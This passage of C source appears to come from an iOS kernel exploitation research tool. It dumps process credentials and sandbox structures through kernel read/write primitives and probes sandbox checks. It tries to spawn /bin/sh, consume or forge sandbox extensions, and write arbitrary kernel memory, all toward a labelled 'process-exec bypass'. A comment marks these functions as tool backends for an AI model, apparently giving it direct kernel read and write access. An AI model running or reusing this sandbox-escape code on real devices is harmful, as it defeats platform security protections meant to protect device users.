                uint64_t node_name_ptr = *(uint64_t*)(node_data + 0x08);

                buf_append("    +%02x -> 0x%llx\n", i,
                    (unsigned long long)val);

                // Try to read as string pointer at offset 0x08
                if (kaddr_ok(node_name_ptr)) {
                    char name[128] = {0};
                    kreadbuf(node_name_ptr, name, 100);
                    // Check if it looks like a readable string
                    int is_str = 1;
                    for (int k = 0; k < 80 && name[k]; k++) {
                        if (name[k] < 0x20 || name[k] > 0x7e) {
                            is_str = 0; break;
                        }
                    }
                    if (is_str && name[0]) {
                        buf_append("      name: \"%s\"\n", name);
                    }
                }
                // node first 32 bytes
                buf_append("      data:");
                for (int j = 0; j < 32; j++)
                    buf_append(" %02x", node_data[j]);
                buf_append("\n");

                // Follow chain if next is valid
                if (kaddr_ok(node_next) && node_next != val) {
                    buf_append("      -> next: 0x%llx\n",
                        (unsigned long long)node_next);
                }
            }
        }

        // Compare to launchd extension set
        if (have_launchd && kaddr_ok(launchd_info.extension_set)) {
            buf_append("\n  Launchd extension_set: 0x%llx\n",
                (unsigned long long)launchd_info.extension_set);
            uint8_t ld_ext[128];
            kreadbuf(launchd_info.extension_set, ld_ext, 128);
            buf_append("  Launchd ext raw (128b):\n");
            for (int i = 0; i < 128; i += 16) {
                buf_append("    +%02x:", i);
                for (int j = 0; j < 16; j++)
                    buf_append(" %02x", ld_ext[i + j]);
                buf_append("\n");
            }
        }
    } else {
        buf_append("  extension_set not valid\n");
    }

    // ── Test K: sandbox_check for specific operations ──
    bc("[SWAP] Test K: sandbox_check ops\n");
    buf_append("\n-- Test K: Targeted sandbox_check --\n");
    {
        pid_t mypid = getpid();
        struct { const char *op; int filter; const char *arg; } checks[] = {
            {"process-exec",  SANDBOX_FILTER_PATH, "/bin/sh"},
            {"process-exec",  SANDBOX_FILTER_PATH, "/usr/bin/env"},
            {"process-exec",  SANDBOX_FILTER_PATH, "/usr/lib/dyld"},
            {"process-exec*", SANDBOX_FILTER_NONE, NULL},
            {"process-fork",  SANDBOX_FILTER_NONE, NULL},
            {"mach-lookup",   SANDBOX_FILTER_GLOBAL_NAME,
                "com.apple.springboard.services"},
            {"mach-lookup",   SANDBOX_FILTER_GLOBAL_NAME,
                "com.apple.frontboard.systemappservices"},
            {"mach-lookup",   SANDBOX_FILTER_GLOBAL_NAME,
                "com.apple.backboard.hid"},
            {"mach-lookup",   SANDBOX_FILTER_GLOBAL_NAME,
                "com.apple.lsd.mapdb"},
            {"mach-lookup",   SANDBOX_FILTER_GLOBAL_NAME,
                "com.apple.runningboard"},
            {"mach-lookup",   SANDBOX_FILTER_GLOBAL_NAME,
                "com.apple.SecurityServer"},
            {"mach-lookup",   SANDBOX_FILTER_GLOBAL_NAME,
                "com.apple.distributed_notifications@Gv3"},
        };
        int n = sizeof(checks) / sizeof(checks[0]);
        for (int i = 0; i < n; i++) {
            int r;
            if (checks[i].arg) {
                r = sandbox_check(mypid, checks[i].op,
                    checks[i].filter | SANDBOX_CHECK_NO_REPORT,
                    checks[i].arg);
            } else {
                r = sandbox_check(mypid, checks[i].op,
                    SANDBOX_FILTER_NONE | SANDBOX_CHECK_NO_REPORT);
            }
            buf_append("  %s %s%s%s: %s\n",
                checks[i].op,
                checks[i].arg ? "(" : "",
                checks[i].arg ? checks[i].arg : "",
                checks[i].arg ? ")" : "",
                r == 0 ? "ALLOWED" : "BLOCKED");
        }
    }

    // ── Analysis ──
    buf_append("\n-- v15 Analysis --\n");
    buf_append("v15 TESTED:\n");
    buf_append("  G: Deep sandbox structure comparison (us vs launchd)\n");
    buf_append("  H: SBS launch variants (non-suspended, debugging, options, URL)\n");
    buf_append("  I: URL scheme enumeration (private, public, per-scheme apps)\n");
    buf_append("  J: Extension set deep dive with node walk\n");
    buf_append("  K: Targeted sandbox_check for mach-lookup services\n");

    bc("[SWAP] v15 complete\n");
    bc_close();
    return buf_finish();
}

char *kresearch_add_exec_extension(void) {
    buf_init();
    buf_append("=== ADD PROCESS-EXEC EXTENSION (EXPERIMENTAL) ===\n\n");
    buf_append("NOTE: Sandbox extensions are class-based. Process-exec may not\n");
    buf_append("use the extension mechanism. Testing anyway...\n\n");

    // This is speculative — the sandbox may not check extensions for process-exec.
    // The filesystem escape works because file-read/write-data operations check
    // the extension set. Process operations might be profile-only.

    proc_info_t self_info;
    gather_proc_info(proc_self(), &self_info);

    if (!kaddr_ok(self_info.extension_set)) {
        buf_append("ERROR: No extension set found\n");
        return buf_finish();
    }

    buf_append("Extension set at: 0x%llx\n", self_info.extension_set);

    // Check current sandbox state for process-exec
    pid_t pid = getpid();
    int exec_check = sandbox_check(pid, "process-exec",
                                    SANDBOX_FILTER_PATH | SANDBOX_CHECK_NO_REPORT,
                                    "/bin/sh");
    buf_append("Current process-exec status: %s\n",
               exec_check == 0 ? "ALLOWED" : "BLOCKED");

    if (exec_check == 0) {
        buf_append("Already allowed — nothing to do!\n");
        return buf_finish();
    }

    // Enumerate all extension buckets to understand the structure
    buf_append("\nCurrent extension buckets:\n");
    for (int i = 0; i < 9; i++) {
        uint64_t bucket = kread_ptr(self_info.extension_set + (i * 8));
        if (bucket && kptr_heap_ok(bucket)) {
            struct extension_class_node node = {0};
            kreadbuf(bucket, &node, sizeof(node));
            char name[128] = {0};
            if (kaddr_ok((uint64_t)node.class_name)) {
                kreadbuf((uint64_t)node.class_name, name, sizeof(name) - 1);
            }
            buf_append("  bucket[%d]: 0x%llx class=\"%s\" count=%llu\n",
                       i, bucket, name, (unsigned long long)node.count);

            // Walk extension list
            uint64_t ext = (uint64_t)node.ext_list_head;
            int j = 0;
            while (ext && kptr_heap_ok_aligned(ext, 0x20) && j < 5) {
                uint8_t eraw[EXT_RAW_SIZE];
                memset(eraw, 0, sizeof(eraw));
                kreadbuf(ext, eraw, sizeof(eraw));
                char path[128] = {0};
                uint64_t data_ptr = *(uint64_t *)(eraw + EXT_OFF_DATA);
                if (kaddr_ok(data_ptr)) {
                    kreadbuf(data_ptr, path, sizeof(path) - 1);
                }
                uint64_t data_len = *(uint64_t *)(eraw + EXT_OFF_DATALEN);
                buf_append("    ext: path=\"%s\" pathlen=%llu\n",
                           path, (unsigned long long)data_len);
                uint64_t next = *(uint64_t *)(eraw + 0x00);
                if (next && !kptr_heap_ok_aligned(next, 0x20)) {
                    buf_append("    ⚠️ STOPPED: ext next 0x%llx unsafe (align=0x%llx)\n",
                               next, next & 0x1F);
                    break;
                }
                ext = next;
                j++;
            }
        }
    }

    buf_append("\nTo add a process-exec extension, we would need to create a new\n");
    buf_append("extension_class_node for 'com.apple.sandbox.executable' and link it\n");
    buf_append("into the extension set. However, this requires allocating kernel memory\n");
    buf_append("for the new structures, which is complex with only kwrite.\n");
    buf_append("\nRecommendation: Try sandbox profile swap first (kresearch swap_profile).\n");

    return buf_finish();
}

char *kresearch_test_spawn(void) {
    buf_init();
    buf_append("=== POSIX_SPAWN TEST ===\n\n");

    // Check sandbox state
    pid_t pid = getpid();
    int exec_check = sandbox_check(pid, "process-exec",
                                    SANDBOX_FILTER_PATH | SANDBOX_CHECK_NO_REPORT,
                                    "/bin/sh");
    int fork_check = sandbox_check(pid, "process-fork", SANDBOX_CHECK_NO_REPORT);
    buf_append("sandbox process-exec /bin/sh: %s\n",
               exec_check == 0 ? "ALLOWED" : "BLOCKED");
    buf_append("sandbox process-fork: %s\n",
               fork_check == 0 ? "ALLOWED" : "BLOCKED");

    // Check our credentials
    buf_append("getuid()=%d geteuid()=%d\n", getuid(), geteuid());

    // Try posix_spawn with different binaries
    const char *binaries[] = {"/bin/sh", "/bin/echo", "/usr/bin/id", NULL};
    for (int i = 0; binaries[i]; i++) {
        buf_append("\nTrying posix_spawn(%s):\n", binaries[i]);

        pid_t child = 0;
        char *argv[] = {(char *)binaries[i], NULL};
        if (strcmp(binaries[i], "/bin/sh") == 0) {
            char *sh_argv[] = {"/bin/sh", "-c", "echo spawn_ok", NULL};
            argv[0] = sh_argv[0];
            // Can't reassign fixed array, do it inline
        }
        char *envp[] = {"PATH=/usr/bin:/bin:/usr/sbin:/sbin", NULL};

        posix_spawnattr_t attr;
        posix_spawnattr_init(&attr);

        char *spawn_argv[4];
        if (strcmp(binaries[i], "/bin/sh") == 0) {
            spawn_argv[0] = "/bin/sh";
            spawn_argv[1] = "-c";
            spawn_argv[2] = "echo spawn_ok";
            spawn_argv[3] = NULL;
        } else {
            spawn_argv[0] = (char *)binaries[i];
            spawn_argv[1] = NULL;
        }

        int ret = posix_spawn(&child, binaries[i], NULL, &attr, spawn_argv, envp);
        posix_spawnattr_destroy(&attr);

        if (ret == 0) {
            buf_append("  SUCCESS! PID=%d\n", child);
            int status = 0;
            waitpid(child, &status, 0);
            int exit_code = WIFEXITED(status) ? WEXITSTATUS(status) : -1;
            buf_append("  Exit code: %d\n", exit_code);
        } else {
            buf_append("  FAILED: %d (%s)\n", ret, strerror(ret));
            // Decode specific errno
            switch (ret) {
                case EPERM:
                    buf_append("  → EPERM: Operation not permitted (credential/sandbox issue)\n");
                    break;
                case ENOENT:
                    buf_append("  → ENOENT: Binary not found at path\n");
                    break;
                case EACCES:
                    buf_append("  → EACCES: Permission denied (filesystem access)\n");
                    break;
                case ENOEXEC:
                    buf_append("  → ENOEXEC: Not executable (code signing?)\n");
                    break;
                default:
                    break;
            }
        }
    }

    return buf_finish();
}

// ════════════════════════════════════════════════════════════════════
// Kernel research primitives — Claude API tool backends
// ════════════════════════════════════════════════════════════════════

char *kresearch_kread(uint64_t address, int size) {
    buf_init();

    if (!kaddr_ok(address)) {
        buf_append("ERROR: invalid kernel address 0x%llx\n", address);
        return buf_finish();
    }

    if (size < 1) size = 64;
    if (size > 4096) size = 4096;

    buf_append("kread @ 0x%llx, %d bytes:\n", address, size);

    uint8_t *data = (uint8_t *)malloc(size);
    kreadbuf(address, data, size);

    for (int i = 0; i < size; i += 16) {
        buf_append("  +%04x: ", i);
        for (int j = 0; j < 16 && (i + j) < size; j++) {
            buf_append("%02x ", data[i + j]);
        }
        buf_append(" |");
        for (int j = 0; j < 16 && (i + j) < size; j++) {
            uint8_t b = data[i + j];
            buf_append("%c", (b >= 0x20 && b < 0x7f) ? b : '.');
        }
        buf_append("|\n");
    }

    buf_append("\nPointer-sized values:\n");
    int ptrCount = size / 8;
    if (ptrCount > 32) ptrCount = 32;
    for (int i = 0; i < ptrCount; i++) {
        uint64_t val = 0;
        memcpy(&val, data + (i * 8), 8);
        if (val != 0) {
            buf_append("  +0x%02x: 0x%016llx", i * 8, val);
            if (kaddr_ok(val)) {
                buf_append(" (kernel ptr)");
            }
            buf_append("\n");
        }
    }

    free(data);
    return buf_finish();
}

char *kresearch_kread64(uint64_t address) {
    buf_init();

    if (!kaddr_ok(address)) {
        buf_append("ERROR: invalid kernel address 0x%llx\n", address);
        return buf_finish();
    }

    uint64_t value = kread64(address);
    buf_append("kread64 @ 0x%llx:\n", address);
    buf_append("  value: 0x%016llx (%llu)\n", value, value);
    if (kaddr_ok(value)) {
        buf_append("  looks like a kernel pointer\n");
        uint64_t deref = kread64(value);
        buf_append("  *value: 0x%016llx\n", deref);
    }
    uint32_t lo = (uint32_t)(value & 0xFFFFFFFF);
    uint32_t hi = (uint32_t)(value >> 32);
    buf_append("  lo32: 0x%08x (%u)  hi32: 0x%08x (%u)\n", lo, lo, hi, hi);

    return buf_finish();
}

char *kresearch_follow_chain(uint64_t base, const char *offsets_csv) {
    buf_init();

    if (!kaddr_ok(base)) {
        buf_append("ERROR: invalid base address 0x%llx\n", base);
        return buf_finish();
    }

    buf_append("Follow pointer chain from 0x%llx:\n", base);
    buf_append("  [0] base = 0x%llx\n", base);

    uint64_t current = base;
    int step = 1;

    char *offsets_copy = strdup(offsets_csv ? offsets_csv : "");
    char *saveptr = NULL;
    char *token = strtok_r(offsets_copy, ",", &saveptr);

    while (token != NULL) {
        while (*token == ' ') token++;

        uint64_t offset = 0;
        if (token[0] == '0' && (token[1] == 'x' || token[1] == 'X')) {
            offset = strtoull(token + 2, NULL, 16);
        } else {
            offset = strtoull(token, NULL, 10);
        }

        uint64_t addr = current + offset;
        buf_append("  [%d] 0x%llx + 0x%llx = 0x%llx\n", step, current, offset, addr);

        if (!kaddr_ok(addr)) {
            buf_append("  ERROR: address 0x%llx is not a valid kernel address\n", addr);
            break;
        }

        uint64_t value = kread_ptr(addr);
        buf_append("       → 0x%016llx", value);

        if (kaddr_ok(value)) {
            buf_append(" (valid kernel ptr)\n");
            current = value;
        } else if (value == 0) {
            buf_append(" (NULL)\n");
            break;
        } else {
            buf_append(" (not a kernel ptr, raw value)\n");
            current = value;
        }

        step++;
        token = strtok_r(NULL, ",", &saveptr);
    }

    buf_append("\nFinal value: 0x%016llx\n", current);
    free(offsets_copy);
    return buf_finish();
}

char *kresearch_proc_info(int pid) {
    buf_init();

    uint64_t proc;
    if (pid == 0) {
        proc = proc_self();
        buf_append("=== PROC INFO: self ===\n");
    } else {
        proc = proc_find((pid_t)pid);
        buf_append("=== PROC INFO: PID %d ===\n", pid);
    }

    if (!proc || !kaddr_ok(proc)) {
        buf_append("ERROR: could not find proc for PID %d\n", pid);
        return buf_finish();
    }

    proc_info_t info;
    if (gather_proc_info(proc, &info) != 0) {
        buf_append("ERROR: gather_proc_info failed\n");
        return buf_finish();
    }

    dump_proc_info(&info);

    buf_append("\n--- Additional Details ---\n");
    buf_append("  sandbox addr:   0x%llx\n", info.sandbox);
    buf_append("  profile addr:   0x%llx\n", info.sandbox_profile);
    buf_append("  extension_set:  0x%llx\n", info.extension_set);
    buf_append("  cs_flags:       0x%x\n", info.cs_flags);

    if (kaddr_ok(info.sandbox)) {
        buf_append("\n--- Sandbox Structure (first 128 bytes) ---\n");
        uint8_t sbdata[128];
        kreadbuf(info.sandbox, sbdata, 128);
        for (int i = 0; i < 128; i += 16) {
            buf_append("  +%02x: ", i);
            for (int j = 0; j < 16; j++) {
                buf_append("%02x ", sbdata[i + j]);
            }
            buf_append("\n");
        }
    }

    return buf_finish();
}

char *kresearch_sandbox_check_op(const char *operation, const char *name) {
    buf_init();

    if (!operation || strlen(operation) == 0) {
        buf_append("ERROR: operation string required\n");
        return buf_finish();
    }

    buf_append("sandbox_check for operation: %s\n", operation);

    int result;
    if (name && strlen(name) > 0) {
        buf_append("  with name: %s\n", name);

        int filter_type = SANDBOX_FILTER_NONE;
        if (strstr(operation, "file-") != NULL) {
            filter_type = SANDBOX_FILTER_PATH;
        } else if (strstr(operation, "mach-lookup") != NULL ||
                   strstr(operation, "iokit-open") != NULL) {
            filter_type = SANDBOX_FILTER_GLOBAL_NAME;
        }

        result = sandbox_check(getpid(), operation,
                               filter_type | SANDBOX_CHECK_NO_REPORT, name);
    } else {
        result = sandbox_check(getpid(), operation,
                               SANDBOX_FILTER_NONE | SANDBOX_CHECK_NO_REPORT);
    }

    buf_append("  result: %d (%s)\n", result, result == 0 ? "ALLOWED" : "DENIED");

    return buf_finish();
}

char *kresearch_sandbox_dump(int offset, int size) {
    buf_init();

    proc_info_t self_info;
    gather_proc_info(proc_self(), &self_info);

    if (!kaddr_ok(self_info.sandbox)) {
        buf_append("ERROR: no sandbox structure found\n");
        return buf_finish();
    }

    if (size < 1) size = 128;
    if (size > 1024) size = 1024;
    if (offset < 0) offset = 0;

    uint64_t addr = self_info.sandbox + (uint64_t)offset;
    buf_append("Sandbox dump: sandbox=0x%llx offset=+0x%x size=%d\n",
               self_info.sandbox, offset, size);
    buf_append("  Reading from: 0x%llx\n\n", addr);

    if (!kaddr_ok(addr)) {
        buf_append("ERROR: resulting address 0x%llx is invalid\n", addr);
        return buf_finish();
    }

    uint8_t *data = (uint8_t *)malloc(size);
    kreadbuf(addr, data, size);

    for (int i = 0; i < size; i += 16) {
        buf_append("  +%04x: ", offset + i);
        for (int j = 0; j < 16 && (i + j) < size; j++) {
            buf_append("%02x ", data[i + j]);
        }
        buf_append(" |");
        for (int j = 0; j < 16 && (i + j) < size; j++) {
            uint8_t b = data[i + j];
            buf_append("%c", (b >= 0x20 && b < 0x7f) ? b : '.');
        }
        buf_append("|\n");
    }

    buf_append("\nPointer values:\n");
    int ptrCount = size / 8;
    if (ptrCount > 64) ptrCount = 64;
    for (int i = 0; i < ptrCount; i++) {
        uint64_t val = 0;
        memcpy(&val, data + (i * 8), 8);
        if (val != 0) {
            buf_append("  +0x%02x: 0x%016llx", offset + i * 8, val);
            if (kaddr_ok(val)) buf_append(" (kptr)");
            buf_append("\n");
        }
    }

    free(data);
    return buf_finish();
}

char *kresearch_dlsym_lookup(const char *framework_path, const char *symbol_name) {
    buf_init();

    if (!framework_path || !symbol_name) {
        buf_append("ERROR: framework_path and symbol_name required\n");
        return buf_finish();
    }

    buf_append("dlsym lookup: %s in %s\n", symbol_name, framework_path);

    void *handle = dlopen(framework_path, RTLD_NOW | RTLD_GLOBAL);
    if (!handle) {
        buf_append("ERROR: dlopen failed: %s\n", dlerror());
        return buf_finish();
    }

    void *sym = dlsym(handle, symbol_name);
    if (sym) {
        buf_append("  address: %p (0x%llx)\n", sym, (uint64_t)sym);
    } else {
        buf_append("  NOT FOUND: %s\n", dlerror());
    }

    return buf_finish();
}

char *kresearch_dlcall(const char *framework_path, const char *function_name,
                       uint64_t arg0, uint64_t arg1, uint64_t arg2, uint64_t arg3) {
    buf_init();

    if (!framework_path || !function_name) {
        buf_append("ERROR: framework_path and function_name required\n");
        return buf_finish();
    }

    buf_append("dlcall: %s(%llu, %llu, %llu, %llu)\n",
               function_name, arg0, arg1, arg2, arg3);

    void *handle = dlopen(framework_path, RTLD_NOW | RTLD_GLOBAL);
    if (!handle) {
        buf_append("ERROR: dlopen failed: %s\n", dlerror());
        return buf_finish();
    }

    typedef uint64_t (*func_ptr_t)(uint64_t, uint64_t, uint64_t, uint64_t);
    func_ptr_t func = (func_ptr_t)dlsym(handle, function_name);
    if (!func) {
        buf_append("ERROR: dlsym failed: %s\n", dlerror());
        return buf_finish();
    }

    buf_append("  function at: %p\n", func);

    uint64_t result = func(arg0, arg1, arg2, arg3);
    buf_append("  result: 0x%llx (%llu)\n", result, result);
    if ((int64_t)result < 0 && (int64_t)result > -1000) {
        buf_append("  (as signed: %lld — may be error code)\n", (int64_t)result);
    }

    return buf_finish();
}

char *kresearch_run_command(const char *command_name) {
    if (!command_name) return strdup("ERROR: command_name required");

    if (strcmp(command_name, "dump_self") == 0)        return kresearch_dump_self();
    if (strcmp(command_name, "dump_proc_1") == 0)      return kresearch_dump_proc(1);
    if (strcmp(command_name, "compare") == 0)           return kresearch_compare_creds(1);
    if (strcmp(command_name, "sandbox_ops") == 0)       return kresearch_check_sandbox_ops();
    if (strcmp(command_name, "sandbox_profile") == 0)   return kresearch_dump_sandbox_profile();
    if (strcmp(command_name, "swap_profile") == 0)      return kresearch_swap_sandbox_profile();
    if (strcmp(command_name, "exec_ext") == 0)          return kresearch_add_exec_extension();
    if (strcmp(command_name, "test_spawn") == 0)        return kresearch_test_spawn();
    if (strcmp(command_name, "breadcrumbs") == 0)       return kresearch_read_breadcrumbs();

    char *msg = (char *)malloc(512);
    snprintf(msg, 512,
        "ERROR: unknown command '%s'. Available commands:\n"
        "  dump_self, dump_proc_1, compare, sandbox_ops, sandbox_profile,\n"
        "  swap_profile, exec_ext, test_spawn, breadcrumbs",
        command_name);
    return msg;
}

char *kresearch_proc_list(const char *name_filter) {
    buf_init();

    uint64_t self_proc = proc_self();
    if (!self_proc || !kaddr_ok(self_proc)) {
        buf_append("ERROR: proc_self() failed — kernel r/w not available\n");
        return buf_finish();
    }

    buf_append("=== KERNEL PROCESS LIST ===\n");
    if (name_filter && strlen(name_filter) > 0) {
        buf_append("Filter: '%s'\n", name_filter);
    }
    buf_append("\n");

    int shown = 0;
    for (pid_t pid = 0; pid < 2000; pid++) {
        uint64_t proc = proc_find(pid);
        if (!proc || !kptr_ok(proc)) continue;

        char name[32] = {0};
        kreadbuf(proc + off_proc_p_name, name, 31);

        if (name_filter && strlen(name_filter) > 0 &&
            strcasestr(name, name_filter) == NULL) {
            continue;
        }

        uint64_t proc_ro = kread_ptr(proc + off_proc_p_proc_ro);
        uint32_t uid = 0;
        if (kaddr_ok(proc_ro)) {
            uint64_t ucred = kread_ptr(proc_ro + off_proc_ro_p_ucred);
            if (kaddr_ok(ucred)) {
                uid = kread32(ucred + 0x18);
            }
        }

        buf_append("  PID %5d  uid=%u  proc=0x%llx  %s\n",
                   pid, uid, proc, name);
        shown++;
        if (shown >= 200) {
            buf_append("  ... (limited to 200 results)\n");
            break;
        }
    }

    buf_append("\nTotal shown: %d\n", shown);
    return buf_finish();
}

// ════════════════════════════════════════════════════════════════════
// Kernel WRITE primitives + advanced test tools
// ════════════════════════════════════════════════════════════════════

char *kresearch_kwrite64(uint64_t address, uint64_t value) {
    buf_init();

    if (!kaddr_ok(address)) {
        buf_append("ERROR: invalid kernel address 0x%llx\n", address);
        return buf_finish();
    }

    // Read before
    uint64_t before = kread64(address);
    buf_append("kwrite64 @ 0x%llx:\n", address);
    buf_append("  before: 0x%016llx\n", before);
    buf_append("  writing: 0x%016llx\n", value);

    // Do the write
    kwrite64(address, value);

    // Read back to confirm
    uint64_t after = kread64(address);
    buf_append("  after:  0x%016llx\n", after);

    if (after == value) {
        buf_append("  STATUS: WRITE CONFIRMED ✓\n");
    } else if (after == before) {
        buf_append("  STATUS: WRITE FAILED — value unchanged (PPL/SPTM protected?)\n");
    } else {
        buf_append("  STATUS: WRITE PARTIAL — value changed but not to expected\n");
    }

    return buf_finish();
}

char *kresearch_kwrite(uint64_t address, const char *hex_data) {
    buf_init();

    if (!kaddr_ok(address)) {
        buf_append("ERROR: invalid kernel address 0x%llx\n", address);
        return buf_finish();
    }

    if (!hex_data || strlen(hex_data) == 0) {
        buf_append("ERROR: hex_data required (e.g. \"00000000\" or \"ff ff ff\")\n");
        return buf_finish();
    }

    // Parse hex string into bytes — skip spaces
    uint8_t bytes[512];
    int byte_count = 0;
    const char *p = hex_data;
    while (*p && byte_count < 512) {
        while (*p == ' ' || *p == '\t') p++;
        if (!*p) break;

        char hi = *p++;
        if (!*p) { buf_append("ERROR: odd number of hex chars\n"); return buf_finish(); }
        char lo = *p++;

        int h = (hi >= '0' && hi <= '9') ? hi - '0' :
                (hi >= 'a' && hi <= 'f') ? hi - 'a' + 10 :
                (hi >= 'A' && hi <= 'F') ? hi - 'A' + 10 : -1;
        int l = (lo >= '0' && lo <= '9') ? lo - '0' :
                (lo >= 'a' && lo <= 'f') ? lo - 'a' + 10 :
                (lo >= 'A' && lo <= 'F') ? lo - 'A' + 10 : -1;
        if (h < 0 || l < 0) {
            buf_append("ERROR: invalid hex char near '%c%c'\n", hi, lo);
            return buf_finish();
        }
        bytes[byte_count++] = (uint8_t)((h << 4) | l);
    }

    buf_append("kwrite @ 0x%llx, %d bytes:\n", address, byte_count);

    // Read before
    uint8_t before[512];
    kreadbuf(address, before, byte_count);
    buf_append("  before: ");
    for (int i = 0; i < byte_count && i < 32; i++) buf_append("%02x ", before[i]);
    if (byte_count > 32) buf_append("...");
    buf_append("\n");

    buf_append("  writing: ");
    for (int i = 0; i < byte_count && i < 32; i++) buf_append("%02x ", bytes[i]);
    if (byte_count > 32) buf_append("...");
    buf_append("\n");

    // Write
    kwritebuf(address, bytes, byte_count);

    // Read back
    uint8_t after[512];
    kreadbuf(address, after, byte_count);
    buf_append("  after:  ");
    for (int i = 0; i < byte_count && i < 32; i++) buf_append("%02x ", after[i]);
    if (byte_count > 32) buf_append("...");
    buf_append("\n");

    // Verify
    int matches = 1;
    for (int i = 0; i < byte_count; i++) {
        if (after[i] != bytes[i]) { matches = 0; break; }
    }

    if (matches) {
        buf_append("  STATUS: WRITE CONFIRMED ✓ (%d bytes written)\n", byte_count);
    } else {
        int unchanged = 1;
        for (int i = 0; i < byte_count; i++) {
            if (after[i] != before[i]) { unchanged = 0; break; }
        }
        if (unchanged) {
            buf_append("  STATUS: WRITE FAILED — memory unchanged (PPL/SPTM protected?)\n");
        } else {
            buf_append("  STATUS: WRITE PARTIAL — some bytes changed but not all\n");
        }
    }

    return buf_finish();
}

char *kresearch_posix_spawn_test(const char *binary_path, const char *args_str) {
    buf_init();

    if (!binary_path || strlen(binary_path) == 0) {
        buf_append("ERROR: binary_path required\n");
        return buf_finish();
    }

    buf_append("=== posix_spawn test ===\n");
    buf_append("  binary: %s\n", binary_path);
    if (args_str && strlen(args_str) > 0) {
        buf_append("  args: %s\n", args_str);
    }

    // Check if binary exists
    if (access(binary_path, F_OK) != 0) {
        buf_append("  WARNING: binary not found at path (errno %d: %s)\n",
                   errno, strerror(errno));
        buf_append("  Attempting spawn anyway...\n");
    } else {
        buf_append("  binary exists: YES\n");
        if (access(binary_path, X_OK) == 0) {
            buf_append("  executable: YES\n");
        } else {
            buf_append("  executable: NO (errno %d: %s)\n", errno, strerror(errno));
        }
    }

    // Pre-spawn sandbox check
    int sb_exec = sandbox_check(getpid(), "process-exec",
                                SANDBOX_FILTER_PATH | SANDBOX_CHECK_NO_REPORT,
                                binary_path);
    buf_append("  sandbox_check(process-exec, %s): %s\n",
               binary_path, sb_exec == 0 ? "ALLOWED" : "DENIED");

    int sb_fork = sandbox_check(getpid(), "process-fork",
                                SANDBOX_FILTER_NONE | SANDBOX_CHECK_NO_REPORT);
    buf_append("  sandbox_check(process-fork): %s\n",
               sb_fork == 0 ? "ALLOWED" : "DENIED");

    // Build argv
    char *argv[32] = {0};
    argv[0] = (char *)binary_path;
    int argc = 1;

    if (args_str && strlen(args_str) > 0) {
        char *args_copy = strdup(args_str);
        char *save = NULL;
        char *tok = strtok_r(args_copy, " ", &save);
        while (tok && argc < 31) {
            argv[argc++] = tok;
            tok = strtok_r(NULL, " ", &save);
        }
        // Note: args_copy leaked — acceptable for research tool
    }
    argv[argc] = NULL;

    // Spawn attributes — SETEXEC to try in-process exec as fallback data
    posix_spawnattr_t attr;
    posix_spawnattr_init(&attr);
    posix_spawnattr_setflags(&attr, POSIX_SPAWN_SETPGROUP);

    // Environment
    char *envp[] = {"PATH=/usr/bin:/bin:/usr/sbin:/sbin", NULL};

    pid_t child = -1;
    errno = 0;
    int ret = posix_spawn(&child, binary_path, NULL, &attr, argv, envp);
    int spawn_errno = errno;
    posix_spawnattr_destroy(&attr);

    buf_append("\n  posix_spawn returned: %d\n", ret);
    if (ret == 0) {
        buf_append("  ✅ SUCCESS! child PID = %d\n", child);
        int status = 0;
        waitpid(child, &status, WNOHANG);
        if (WIFEXITED(status)) {
            buf_append("  child exit code: %d\n", WEXITSTATUS(status));
        } else {
            buf_append("  child still running or signaled\n");
        }
    } else {
        buf_append("  ❌ FAILED: %d (%s)\n", ret, strerror(ret));
        if (spawn_errno != 0 && spawn_errno != ret) {
            buf_append("  errno: %d (%s)\n", spawn_errno, strerror(spawn_errno));
        }
        switch (ret) {
            case EPERM:
                buf_append("  → EPERM: sandbox or AMFI denied execution\n");
                break;
            case ENOENT:
                buf_append("  → ENOENT: binary not found\n");
                break;
            case EACCES:
                buf_append("  → EACCES: permission denied (filesystem)\n");
                break;
            case ENOEXEC:
                buf_append("  → ENOEXEC: not executable (code signing?)\n");
                break;
            default:
                break;
        }
    }

    return buf_finish();
}

char *kresearch_sandbox_ext_consume(const char *token) {
    buf_init();

    if (!token || strlen(token) == 0) {
        buf_append("ERROR: extension token string required\n");
        return buf_finish();
    }

    buf_append("=== sandbox_extension_consume ===\n");
    buf_append("  token: %.80s%s\n", token, strlen(token) > 80 ? "..." : "");
    buf_append("  token length: %zu\n", strlen(token));

    // Try to consume it
    int64_t handle = sandbox_extension_consume(token);
    buf_append("  result handle: %lld\n", handle);

    if (handle > 0) {
        buf_append("  ✅ SUCCESS — extension consumed (handle=%lld)\n", handle);
        buf_append("  Extension is now active for this process.\n");

        // Re-check some operations
        int exec_check = sandbox_check(getpid(), "process-exec",
                                       SANDBOX_FILTER_NONE | SANDBOX_CHECK_NO_REPORT);
        int fork_check = sandbox_check(getpid(), "process-fork",
                                       SANDBOX_FILTER_NONE | SANDBOX_CHECK_NO_REPORT);
        buf_append("  post-consume process-exec: %s\n",
                   exec_check == 0 ? "ALLOWED" : "DENIED");
        buf_append("  post-consume process-fork: %s\n",
                   fork_check == 0 ? "ALLOWED" : "DENIED");
    } else if (handle == 0) {
        buf_append("  ❌ FAILED — returned 0 (invalid token?)\n");
    } else {
        buf_append("  ❌ FAILED — returned %lld (error)\n", handle);
    }

    // Also try sandbox_extension_issue_file for reference
    buf_append("\n--- Attempting to issue extensions ---\n");

    char *file_ext = sandbox_extension_issue_file(APP_SANDBOX_READ,
                                                   "/bin/sh", 0);
    if (file_ext) {
        buf_append("  issue_file(READ, /bin/sh): %.80s...\n", file_ext);
        buf_append("  token length: %zu\n", strlen(file_ext));
        free(file_ext);
    } else {
        buf_append("  issue_file(READ, /bin/sh): FAILED (NULL)\n");
    }

    char *exec_ext = sandbox_extension_issue_file("com.apple.sandbox.executable",
                                                   "/bin/sh", 0);
    if (exec_ext) {
        buf_append("  issue_file(executable, /bin/sh): %.80s...\n", exec_ext);
        int64_t h2 = sandbox_extension_consume(exec_ext);
        buf_append("  consume result: %lld\n", h2);
        free(exec_ext);
    } else {
        buf_append("  issue_file(executable, /bin/sh): FAILED (NULL)\n");
    }

    return buf_finish();
}

// ════════════════════════════════════════════════════════════════════
#pragma mark - Extension Set Dump + Process-Exec Bypass
// ════════════════════════════════════════════════════════════════════

char *kresearch_dump_extensions(void) {
    buf_init();
    buf_append("=== EXTENSION SET DUMP ===\n\n");

    // Auto-calibrate zone bounds to get current zone meta exclusion range.
    // Without this, stale hardcoded defaults can miss shifted zone meta
    // after reboot+KASLR, causing kptr_ok() to approve zone meta addresses
    // → Translation fault → kernel panic when following chain pointers.
    if (!g_zone_map_detected) {
